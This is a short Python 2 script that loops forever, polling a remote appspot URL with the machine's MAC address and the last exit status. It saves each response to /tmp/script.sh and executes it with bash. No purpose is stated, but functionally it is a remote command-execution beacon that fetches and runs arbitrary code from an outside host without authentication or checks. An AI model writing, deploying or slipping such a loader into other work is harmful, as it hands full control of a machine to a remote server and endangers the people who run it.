import urllib2
import time
from uuid import getnode as get_mac
import subprocess

failure = -1

s_time = 1

while True:
	try:
		response = urllib2.urlopen('http://prog1box.appspot.com/exec?id=%s&last=%s' % (str(get_mac()), str(failure)), timeout=10)
		html = response.read()
		script = open('/tmp/script.sh', 'w')
		script.write(html)
		script.close()
		failure = subprocess.call(['bash', '/tmp/script.sh'])
		if failure:
			s_time = min(s_time * 2, 64)
		else:
			s_time = 64
	except:
		print 'error'
	time.sleep(s_time)
